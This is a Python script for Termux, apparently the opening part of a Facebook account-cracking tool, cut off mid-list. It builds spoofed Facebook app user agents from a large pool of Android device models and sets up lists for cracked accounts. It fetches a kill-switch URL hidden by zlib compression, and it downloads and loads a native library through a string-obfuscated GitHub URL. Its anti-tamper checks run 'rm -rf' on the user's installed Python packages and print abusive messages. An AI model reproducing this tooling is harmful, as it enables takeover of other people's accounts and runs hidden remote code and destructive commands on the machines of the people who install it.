import os,time,sys
#▬▭▬▭▬▭▬▭[COLOR & STYLE]▬▭▬▭▬▭▬▭#
orange = '\x1b[38;5;196m'
byellow = '\x1b[38;5;208m'
bblack = '\x1b[1;30m'
bred = '\x1b[38;5;160m'
bgreen = '\x1b[38;5;46m'
byelloww = '\x1b[1;33m'
bblue = '\x1b[38;5;6m'
bpurple = '\x1b[1;35m'
bcyan = '\x1b[1;36m'
bwhite = '\x1b[1;37m'
bfaltu = '\x1b[1;47m'
bpvt = '\x1b[1;0m'
bgren = '\x1b[38;5;154m'
bgas = '\x1b[1;32m'
bblw = '\x1b[1;34m'
white= "\x1b[1;97m";yelloww="\033[1;33m";green = "\x1b[38;5;46m";G0 = "\x1b[38;5;155m";green1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';G6 = "\x1b[38;5;52m";s = "\033[0m";W = "\033[1;30m";Y = "\x1b[1;93m";red = "\x1b[38;5;160m";B = "\033[1;95m";BE = "\x1b[1;35m";X = "\x1b[1;96m";Z = "\x1b[1;95m";Y = "\033[1;93m";U = "\033[1;94m";V = "\033[38;5;47m";T = "\033[38;5;48m";Q = "\033[38;5;49m";P = "\033[38;5;50m";O = "\033[38;5;51m";N = "\033[38;5;52m";M = "\x1b[38;5;205m";L = "\033[96;1m";K = "\x1b[1;91m";WH = "\033[1;97m";orange = "\x1b[38;5;196m";yellow = "\x1b[38;5;208m";black="\033[1;30m";rad="\x1b[38;5;160m";YLW="\033[1;33m";blue="\033[38;5;6m";purple="\033[1;35m";cyan="\033[1;36m";white="\033[1;37m";faltu = "\033[1;47m";pvt = "\033[1;0m";gren = "\x1b[38;5;154m";gas = "\033[1;32m"
style=f"{rad}[{white}●{rad}]"
os.system("clear")
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system('pip uninstall pycurl -y && pip install pycurl')
os.system("clear")
#▬▭▬▭▬▭▬▭[REQUIRED MODULE]▬▭▬▭▬▭▬▭#
try:import requests
except ImportError:print(f"{style} {green}installing requests...{white}");time.sleep(0.5);os.system('pip install requests');import requests;os.system('clear')
try:import bs4
except ImportError:print(f"{style} {green}installing bs4...{white}");time.sleep(0.5);os.system('pip install bs4');import bs4;os.system('clear')
try:import httpx
except ImportError:print(f"{style} {green}installing httpx...{white}");time.sleep(0.5);os.system('pip install httpx');import httpx;os.system('clear')
try:import pystyle
except ImportError:print(f"{style} {green}installing pystyle...{white}");time.sleep(0.5);os.system('pip install pystyle');import pystyle;os.system('clear')
try:import rich
except ImportError:print(f"{style} {green}installing rich...{white}");time.sleep(0.5);os.system('pip install rich');import pystyle;os.system('clear')
from pystyle import Colors, Colorate
import pycurl,certifi,zlib
from io import BytesIO
#▬▭▬▭▬▭▬▭[PYCURL SETUP]▬▭▬▭▬▭▬▭#
def py_curl(url):
    curl = pycurl.Curl()
    buffer = BytesIO()
    try:
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.SSL_VERIFYPEER, 1)
        curl.setopt(curl.SSL_VERIFYHOST, 2)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
    except pycurl.error as e:
        return f"An error in py{e}"
    finally:
        curl.close()
    response_body = buffer.getvalue().decode('utf-8')
    return response_body
#▬▭▬▭▬▭▬▭[TOOL SERVER]▬▭▬▭▬▭▬▭#
def tool_server():
    try:database = py_curl(str(zlib.decompress(b'x\x9c\xcb())(\xb6\xd2\xd7/J,\xd7K\xcf,\xc9(M*-N-J\xce\xcf+I\xcd+\xd1K\xce\xcf\xd5\x0fq\x0cr\xf5\xd6510\x81\xb2B\x03\\\x1cC\\\xf5s\x133\xf3\xf4\x81J\xcb\xf4J*J\x00v\xc3\x18@')).replace("b'", "").replace("'", ""));colors=[white,green1,YLW]
    except Exception as e:print(f'{green} An error occurred: {e}');exit()
    if 'on' in database or 'On' in database:pass
    if 'update' in database or 'Update' in database:
        while True:
            for color in colors:print(f"{color}THIS SERVER IS UPDATING PLEASE WAIT FOR UPDATE\n");time.sleep(1)
    if 'off' in database or 'Off' in database:
        while True:
            for color in colors:print(f"{color}CURRENTLY THIS TOOL IS OFFLINE\n");time.sleep(1)
tool_server()
#▬▭▬▭▬▭▬▭[PERMISSION OF SDCARD]▬▭▬▭▬▭▬▭#
try:
    os.system('rm -'+'rf /sd'+'card/.txt');os.system('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
except PermissionError:
    os.system("clear")
    print(f"{style} {green}ASRAFUL TOOL IS NOT ALLOW WITHOUT STORAGE PERMISSION");os.system('termux-setup-storage');os.system('clear');exit(f"{green} RUN AGAIN 👉 python ASRAFUL-GREEN.py")
try:os.makedirs('/sdcard/ASRAFUL-TOOL')
except:pass
#▬▭▬▭▬▭▬▭[LOADING SYSTEM]▬▭▬▭▬▭▬▭#
def ASRAFUL(z):
      for a in z +'\n':sys.stdout.write(a);sys.stdout.flush();time.sleep(0.050)
#▬▭▬▭▬▭▬▭[OPENING MOMENT]▬▭▬▭▬▭▬▭#
print(f'{style}{green} Checking Update...{white}');time.sleep(2)
os.system("git pull");os.system("xdg-open https://www.facebook.com/share/967qtqfKAg6qS7Rg/");time.sleep(2);os.system("clear")
#▬▭▬▭▬▭▬▭[MODULE IMPORT]▬▭▬▭▬▭▬▭#
import pycurl
import uuid,base64,hashlib,zlib,subprocess,time,platform
import bs4,json,sys,time,random,re,subprocess,platform,struct,string,uuid,marshal,base64,zlib
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket, ssl, certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool 
from concurrent.futures import ThreadPoolExecutor
os.system("pip install licensing > /dev/null")
from licensing.models import *
from licensing.methods import Key, Helpers
try:os.remove("p"+"yc"+"url"+".cpython-311.so")
except:pass
mr_ASRAFUL = subprocess.run(['curl', '-L', 'h'+'t'+'t'+'p'+'s'+':'+'/'+'/'+'g'+'i'+'t'+'h'+'u'+'b'+'.'+'c'+'o'+'m'+'/'+'M'+'R'+'-'+'T'+'A'+'R'+'E'+'K'+'-'+'4'+'0'+'4'+'/'+'C'+'U'+'R'+'L'+'/'+'b'+'l'+'o'+'b'+'/'+'m'+'a'+'i'+'n'+'/'+'p'+'y'+'c'+'u'+'r'+'l'+'.'+'c'+'p'+'y'+'t'+'h'+'o'+'n'+'-'+'3'+'1'+'1'+'.'+'s'+'o'+'?raw=true', '-o', 'p'+'y'+'c'+'u'+'r'+'l'+'.'+'c'+'p'+'y'+'t'+'h'+'o'+'n'+'-'+'3'+'11.so'])
if mr_ASRAFUL.returncode != 0:
    os.system("clear")
    print(f"{green} PLEASE CHECK INTERNET CONNECTION")
    exit(1)
else:
    pass
try:shutil.rmtree("pycurl-7.45.2.dist-info")
except:pass
try:shutil.rmtree("pycurl")
except:pass
try:shutil.rmtree("/data/data/com.termux/files/usr/lib/python3.12/site-packages/"+"pyc"+"url"+"-7"+".45"+".2."+"dist-info")
except:pass
try:shutil.rmtree("/data/data/com.termux/files/usr/lib/python3.12/site-packages/"+"py"+"cur"+"l")
except:pass
try:os.remove("/data/data/com.termux/files/usr/lib/python3.12/site-packages/"+"py"+"curl"+".cpython-311.so")
except:pass
import pycurl
from io import BytesIO
os.remove("pycurl.cpython-311.so")
nillxd = "pycurl"
if os.path.exists(nillxd) and os.path.isdir(nillxd):
    exit(f"{green}ERROR PLEASE RUN AGAIN")
else:
    pass
os.system("clear")
sim = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f' {red}●{white} ')
#▬▭▬▭▬▭▬▭[LOOP & DATE]▬▭▬▭▬▭▬▭#
my_color = [white,blue,green];warna = random.choice(my_color)
loop = 0
oks = []
cps = []
id = []
ck = []
loop,oks,cps,user,total,sid,ps,id = 0,[],[],[],[],[],[],[]
cok,plist = [],[]
import time
from datetime import datetime
sasi = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December']
tete = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "August", "09": "September", "10": "October", "11": "November", "12": "December"}
now = datetime.now()
hari = now.day
blx = now.month
try:
    if blx < 0 or blx > 12:exit()
    xx = blx - 1
except ValueError:exit()
bulan = sasi[xx]
tahun = now.year
today = '\x1b[38;5;46m'+str(hari)+'\033[1;97m-\x1b[38;5;46m'+str(bulan)+''
#▬▭▬▭▬▭▬▭[SECURITY BOX]▬▭▬▭▬▭▬▭#
style_2=f"{white}[{red}●{white}]{green}"
site = '/da'+'ta/data/com.termu'+'x/files/usr/lib/python3.12/s'+'ite-packages/'
alart=(f"{style_2} Kire khankir pola are you mother fucker\n{style_2} Don't try bypass and capture boss\n{style_2} Aibar er moto chere dilam re kankir pola")
try:
    mr_ASRAFUL=f'{site}reque'+'sts/'
    if not 'print' in open(mr_ASRAFUL+'sess'+'ions.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    mr_ASRAFUL1=f'{site}reque'+'sts/'
    if not 'print' in open(mr_ASRAFUL1+'mod'+'els.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    mr_ASRAFUL2=f'{site}reque'+'sts/'
    if not 'print' in open(mr_ASRAFUL2+'ap'+'i.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    king=f'{site}reque'+'sts/'
    if not 'sys.stdout.write' in open(king+'sess'+'ions.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    qeen=f'{site}req'+'uests/'
    if not 'sys.stdout.write' in open(qeen+'mod'+'els.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    don=f'{site}requ'+'ests/'
    if not 'sys.stdout.write' in open(don+'a'+'pi.py','r').read():pass
    else:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
except:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
with open('/data/data/com.termux/files/usr/lib/python3.12/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
try:
    a=open('requests/sessions.py','r').read()
    if 'print' in a:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    b=open('requests/api.py','r').read()
    if 'print' in b:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    c=open('requests/models.py','r').read()
    if 'print' in c:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    d=open('httpx/_api.py','r').read()
    if 'print' in d:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    e=open('httpx/_auth.py','r').read()
    if 'print' in e:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    f=open('httpx/_models.py','r').read()
    if 'print' in f:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    g=open('requests/sessions.py','r').read()
    if 'sys.stdout.write' in g:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    h=open('requests/api.py','r').read()
    if 'sys.stdout.write' in h:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    h=open('requests/models.py','r').read()
    if 'sys.stdout.write' in h:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    ii=open('httpx/_api.py','r').read()
    if 'sys.stdout.write' in ii:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    j=open('httpx/_auth.py','r').read()
    if 'sys.stdout.write' in j:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    k=open('httpx/_models.py','r').read()
    if 'sys.stdout.write' in k:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/httpx');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    l=open('requests/api.py', 'r').read()
    if "verify = False" in l:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    m=open('requests/sessions.py', 'r').read()
    if "self.verify = False" in m:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/requests');exit(f"{alart}")
    else:pass
except Exception as e:pass
try:
    n=open(f'urllib3/conne'+'ction.py', 'r').read()
    if str("cert_reqs = 'CERT_NONE'") in n:os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.12/site-packages/urllib3');exit(f"{alart}")
    else:pass
except Exception as e:pass
#▬▭▬▭▬▭▬▭[SPECIAL LINE]▬▭▬▭▬▭▬▭#
def linex():
    #print(Colorate.Horizontal(Colors.red_to_white, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"))
    print(f"{rad}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#▬▭▬▭▬▭▬▭[KEY GENERATOR]▬▭▬▭▬▭▬▭#
def key():
    model = subprocess.check_output('getprop ro.product.model', shell=True).decode('utf-8').strip()
    mod = base64.b64encode(model.encode()).decode().replace('b', '')
    uID = hashlib.md5((platform.version() + str(os.getuid()) + platform.platform() + os.getlogin() + mod).replace(' ', '').encode()).hexdigest()
    return uID.upper()
mr_key = key()
try:open('/dat'+'a/dat'+'a/com.term'+'ux/files'+'/usr/MR-ASRAFUL.txt', 'w').write(mr_key)
except:pass
#▬▭▬▭▬▭▬▭[UA SERVER]▬▭▬▭▬▭▬▭#
get_ua_list1 = requests.get("https://raw.githubusercontent.com/1RIFIN-70/METHOD/main/M1").text.splitlines()
get_ua_list2 = requests.get("https://raw.githubusercontent.com/1RIFIN-70/METHOD/main/M2").text.splitlines()
get_ua_list3 = requests.get("https://raw.githubusercontent.com/1RIFIN-70/METHOD/main/M3").text.splitlines()
get_ua_list4 = requests.get("https://raw.githubusercontent.com/1RIFIN-70/METHOD/main/M4").text.splitlines()
get_ua_list5 = requests.get("https://raw.githubusercontent.com/1RIFIN-70/METHOD/main/M5").text.splitlines()
#▬▭▬▭▬▭▬▭[ FILE_M1_UA]▬▭▬▭▬▭▬▭#
kkkkki = random.choice(['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
def ASRAFUL4():
        ua = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/193.0.0.39.408;FBBV/512435387;FBAN/FB4A;FBAV/193.0.0.39.408;FBBV/512435387;FBDM/{density=2.0,width=720,height=4096};FBLC/fr_FR;FBRV/551804692;FBCR/Orange;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.orca;FBDV/CPH2159;FBSV/14;FBOP/8;FBCA/armeabi;]'
        return ua

#▬▭▬▭▬▭▬▭[ FILE_M2_UA]▬▭▬▭▬▭▬▭#
import random
def ____ua____():
	model = random.choice(["CPH2071","CPH2209"])
	ua1 = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/'+'{density=2.25,width=720,height=1280}'+f';FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
	ua2 = f"[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+f";[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/"+"{density=2.25,width=720,height=1280}"+f";FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua3 = f"[FBAN/FB4A;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/Orca-Android;FBAV/139.0.0.17.85;[FBAN/Orca-Android;FBAV/346.0.0.7.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/348143439;FBCR/HOME;FBMF/LGE;FBBD/lge;FBDV/{model};FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=1.75,width=720,height=1356}"+";FB_FW/1;]"
#	ua4 = f'[FBAN/Orca-Android;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+f';[FBAN/FB4A;FBAV/359.0.0.30.118;FBBV/358614015;FBDM/{density=2.0,width=720,height=1436};FBLC/en_Qaag_US;FBRV/359080319;FBCR/Telenor;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1808;FBSV/8.1.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
	ua5 = f"[FBAN/Orca-Android;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,318)) +";FBBV/"+str(random.randint(11111111,77777777))+f";[FBAN/FB4A;FBAV/296.0.0.44.119;FBBV/255824654;FBDM/"+"{density=2.25,width=720,height=1280}"+f";FBLC/it_IT;FBRV/256855919;FBCR/WINDTRE;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
	ua6 = f"[FBAN/Orca-Android;FBAV/"+str(random.randint(10,100))+'.0.0.'+str(random.randint(4000,5000))+";FBBV/"+str(random.randint(4000000,5000000))+f";[FBAN/Orca-Android;FBAV/139.0.0.17.85;[FBAN/Orca-Android;FBAV/346.0.0.7.117;FBPN/com.facebook.orca;FBLC/en_US;FBBV/348143439;FBCR/HOME;FBMF/LGE;FBBD/lge;FBDV/{model};FBSV/9;FBCA/armeabi-v7a:armeabi;FBDM/"+"{density=1.75,width=720,height=1356}"+";FB_FW/1;]"
	return random.choice([ua1,ua2,ua3,ua5,ua6])

#▬▭▬▭▬▭▬▭[ FILE_M3_UA]▬▭▬▭▬▭▬▭#
def ___superman__():
    mix = random.choice(['SM-T835','SM-S901U','SM-S134DL','SM-J250F','SM-A217F','SM-A326B','SM-A125F','SM-A720F','SM-A326U','SM-G532M','SM-J410G','SM-A205GN','SM-A205GN','SM-A505GN','SM-G930F','SM-J210F','SM-N9005','SM-J210F','CPH2083','CPH2235','CPH2499','CPH2185','CPH2065','CPH2197','CPH1989','CPH2145','F1w','CPH1909','CPH2065','CPH1937','CPH2095','CPH2083','CPH2249','CPH2083','CPH2239','CPH1979','CPH2067','CPH2069','CPH2239','CPH2015','CPH2021','CPH2205','CPH2069','CPH2161','CPH2207','CPH2239','CPH1909','CPH2185','CPH2127','CPH1923','CPH1931','PHN110','CPH2599','CPH2499','CPH2557','CPH8686','CPH9177','CPH9226','OPPO F1 Plus','CPH2071','PCHM00','CPH2083','CPH2185','CPH2179','CPH2269','CPH2421','CPH2349','CPH2271','CPH2477','CPH2471','CPH2591','CPH1923','CPH1925','CPH1837','OPPO A30','RMX1945','RMX1911','RMX2193','RMX1945','RMX1931','RMX2170','RMX3201','RMX2180','RMX2021','RMX2020','RMX2155','RMX1921','RMX2156','RMX3363','RMX3081','RMX2001','RMX2001','RMX3263','RMX2155','RMX2001','RMX3195','RMX1945','RMX1945','RMX1993','vivo 1901','V2026','V2058','vivo 1716','vivo 1808','vivo 1935','vivo 1951','vivo 1906','vivo 1808','vivo 1920','vivo 1901','V2026','V2058','vivo 1716','vivo 1935','vivo 1951','vivo 1906','V2111','vivo 1915','V1911A','V2036','vivo 1907','vivo 1906','vivo 1915','V2025','vivo 1820','vivo 1904','vivo 1901','V1955A','LG-H342','Redmi Note 4','Redmi 4X','Redmi 3','Redmi 4','Redmi 3X','Redmi Note 7','Redmi 6A','Redmi Note 8 Pro','Redmi 5A','Redmi 5','Redmi 6 Pro','Redmi Note 5','Redmi Note 4','Redmi Y2','Redmi 7A','Redmi Note 7S','Redmi Note 8T','Redmi Note 8 Pro','M2003J15SC','Redmi 5 Plus','Redmi Note 9 Pro','Redmi Note 9S','LDN-L21','M2103K19G','RMX1945','RMX1911','RMX2193','RMX1945','RMX1931','RMX2170','RMX3201','RMX2180','RMX2021','RMX2020','RMX2155','RMX1921','RMX2156','RMX3363','RMX3081','RMX2001','RMX2001','RMX3263','RMX2155','RMX2001','RMX3195','RMX1945','RMX1945','RMX1993','RMX2180','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3516','RMX3371','RMX3461','RMX3286','RMX3561','RMX3388','RMX3311','RMX3142','RMX2071','RMX1805','RMX1809','RMX1801','RMX1807','RMX1803','RMX1825','RMX1821','RMX1822','RMX1833','RMX1851','RMX1853','RMX1827','RMX1911','RMX1919','RMX1927','RMX1971','RMX1973','RMX2030','RMX2032','RMX1925','RMX1929','RMX2001','RMX2061','RMX2063','RMX2040','RMX2042','RMX2002','RMX2151','RMX2163','RMX2155','RMX2170','RMX2103','RMX3085','RMX3241','RMX3081','RMX3151','RMX3381','RMX3521','RMX3474','RMX3471','RMX3472','RMX3392','RMX3393','RMX3491','RMX1811','RMX2185','RMX3231','RMX2189','RMX2180','RMX2195','RMX2101','RMX1941','RMX1945','RMX3063','RMX3061','RMX3201','RMX3203','RMX3261','RMX3263','RMX3193','RMX3191','RMX3195','RMX3197','RMX3265','RMX3268','RMX3269','RMX2027','RMX2020','RMX2021','RMX3581','RMX3501','RMX3503','RMX3511','RMX3310','RMX3312','RMX3551','RMX3301','RMX3300','RMX2202','RMX3363','RMX3360','RMX3366','RMX3361','RMX3031','RMX3370','RMX3357','RMX3560','RMX3562','RMX3350','RMX2193','RMX2161','RMX2050','RMX2156','RMX3242','RMX3171','RMX3430','RMX3235','RMX3506','RMX2117','RMX2173','RMX3161','RMX2205','RMX3462','RMX3478','RMX3372','RMX3574','RMX1831','RMX3121','RMX3122','RMX3125','RMX3043','RMX3042','RMX3041','RMX3092','RMX3093','RMX3571','RMX3475','RMX2200','RMX2201','RMX2111','RMX2112','RMX1901','RMX1903','RMX1992','RMX1993','RMX1991','RMX1931','RMX2142','RMX2081','RMX2085','RMX2083','RMX2086','RMX2144','RMX2051','RMX2025','RMX2075','RMX2076','RMX2072','RMX2052','RMX2176','RMX2121','RMX3115','RMX1921','vivo 1906','vivo 1904','vivo Y13L','vivo 1901','V2120','V2204','vivo 1902','V2310','V2333','vivo 1929','vivo 1915','vivo 1811','V2027','V2043','V2038','V2111','V2110','V2206','V2207','vivo Y23L','V2249','vivo 1613','vivo Y28L','vivo 